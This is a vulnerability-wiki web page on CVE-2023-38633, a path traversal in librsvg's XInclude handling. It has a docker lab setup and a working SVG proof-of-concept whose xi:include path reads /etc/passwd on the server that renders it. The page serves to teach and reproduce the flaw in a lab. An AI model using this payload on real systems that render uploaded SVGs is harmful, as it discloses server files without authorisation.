<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/librsvg/CVE-2023-38633/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Librsvg XInclude Arbitrary file reading (CVE-2023-38633) - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Librsvg XInclude Arbitrary file reading (CVE-2023-38633)", url: "#_top", children: [
              {title: "Vulnerable Environment", url: "#vulnerable-environment" },
              {title: "Exploit", url: "#exploit" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        librsvg XInclude 文件包含漏洞（CVE-2023-38633）
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../langflow/CVE-2025-3248/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../langflow/CVE-2025-3248/README.zh-cn/" class="btn btn-xs btn-link">
        Langflow validate/code API未授权远程代码执行漏洞（CVE-2025-3248）
      </a>
    </div>
    
  </div>

    

    <h1 id="librsvg-xinclude-arbitrary-file-reading-cve-2023-38633">Librsvg XInclude Arbitrary file reading (CVE-2023-38633)<a class="headerlink" href="#librsvg-xinclude-arbitrary-file-reading-cve-2023-38633" title="Permanent link">&para;</a></h1>
<p><a href="README.zh-cn/">中文版本(Chinese version)</a></p>
<p>Librsvg is a free software SVG rendering library written as part of the GNOME project, intended to be lightweight and portable.</p>
<p>A directory traversal problem in the URL decoder of librsvg before 2.56.3 could be used by local or remote attackers to disclose files (on the local filesystem outside of the expected area), as demonstrated by <code>href=".?../../../../../../../../../../etc/passwd</code> in an xi:include element.</p>
<p>References:</p>
<ul>
<li><a href="https://www.canva.dev/blog/engineering/when-url-parsers-disagree-cve-2023-38633/">https://www.canva.dev/blog/engineering/when-url-parsers-disagree-cve-2023-38633/</a></li>
<li><a href="https://gitlab.gnome.org/GNOME/librsvg/-/issues/996">https://gitlab.gnome.org/GNOME/librsvg/-/issues/996</a></li>
</ul>
<h2 id="vulnerable-environment">Vulnerable Environment<a class="headerlink" href="#vulnerable-environment" title="Permanent link">&para;</a></h2>
<p>Executing following command to start a PHP server that uses librsvg 2.50.7 to handle SVG images:</p>
<div class="highlight"><pre><span></span><code>docker compose up -d
</code></pre></div>
<p>After the server is started, browse <code>http://your-ip:8080</code> to see the upload page.</p>
<h2 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h2>
<p>Use <code>&lt;xi:include&gt;</code> to read the local file by this POC:</p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;</span>
<span class="nt">&lt;svg</span><span class="w"> </span><span class="na">width=</span><span class="s">&quot;300&quot;</span><span class="w"> </span><span class="na">height=</span><span class="s">&quot;300&quot;</span><span class="w"> </span><span class="na">xmlns:xi=</span><span class="s">&quot;http://www.w3.org/2001/XInclude&quot;</span><span class="nt">&gt;</span>
<span class="w">  </span><span class="nt">&lt;rect</span><span class="w"> </span><span class="na">width=</span><span class="s">&quot;300&quot;</span><span class="w"> </span><span class="na">height=</span><span class="s">&quot;300&quot;</span><span class="w"> </span><span class="na">style=</span><span class="s">&quot;fill:rgb(255,255,255);&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
<span class="w">  </span><span class="nt">&lt;text</span><span class="w"> </span><span class="na">x=</span><span class="s">&quot;10&quot;</span><span class="w"> </span><span class="na">y=</span><span class="s">&quot;100&quot;</span><span class="nt">&gt;</span>
<span class="w">    </span><span class="nt">&lt;xi:include</span><span class="w"> </span><span class="na">href=</span><span class="s">&quot;.?../../../../../../../../../../etc/passwd&quot;</span><span class="w"> </span><span class="na">parse=</span><span class="s">&quot;text&quot;</span><span class="w"> </span><span class="na">encoding=</span><span class="s">&quot;UTF-8&quot;</span><span class="nt">&gt;</span>
<span class="w">      </span><span class="nt">&lt;xi:fallback&gt;</span>file<span class="w"> </span>not<span class="w"> </span>found<span class="nt">&lt;/xi:fallback&gt;</span>
<span class="w">    </span><span class="nt">&lt;/xi:include&gt;</span>
<span class="w">  </span><span class="nt">&lt;/text&gt;</span>
<span class="nt">&lt;/svg&gt;</span>
</code></pre></div>
<p>Upload this SVG image to server, you will see the <code>/etc/passwd</code> that is embedded in the output image:</p>
<p><img alt="" src="1.png" /></p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        librsvg XInclude 文件包含漏洞（CVE-2023-38633）
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../langflow/CVE-2025-3248/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../langflow/CVE-2025-3248/README.zh-cn/" class="btn btn-xs btn-link">
        Langflow validate/code API未授权远程代码执行漏洞（CVE-2025-3248）
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>